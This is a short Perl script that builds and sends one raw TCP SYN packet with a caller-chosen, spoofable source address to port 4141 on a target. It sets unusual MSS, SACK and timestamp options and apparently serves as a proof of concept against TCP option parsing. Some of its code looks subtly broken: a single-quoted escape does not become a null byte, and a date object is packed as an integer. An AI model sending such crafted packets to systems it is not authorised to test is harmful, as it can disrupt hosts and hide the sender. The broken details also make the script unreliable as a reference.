#!/usr/bin/env perl

use warnings;
use strict;
use Net::RawIP;
use Time::localtime;

my $src = $ARGV[0] or &usage();
my $dst = $ARGV[1] or &usage();
my $sp  = int(rand(6000)) + 1024;
my $dp  = 4141;
my $mss = pack('n', 16396);
my $seq = 0;


print "[+] will connect from $src:$sp to $dst:$dp\n";
print "[+] building SYN packet...\n";
my $syn_pkt = Net::RawIP->new({
                            ip => {
                                saddr   => $src,
                                daddr   => $dst
                            },
                            tcp => {
                                source  => $sp,
                                dest    => $dp,
                                seq     => $seq,
                                syn     => 1,
                                window  => 32792, 
                            }
                        });

$syn_pkt->optset(
                tcp => {
                    type => [ 2, 4, 8 ],	# set MSS and SACK
                    data => [ $mss, '\x00', pack('Q', localtime()) ],
                }
            );
print "[+] sending packet...\n";
$syn_pkt->send( );              # send one packet without delay
print "[+] finished!\n";
exit 0;

sub usage( ) {
	die "usage: $0 <src> <dst>\n";
}


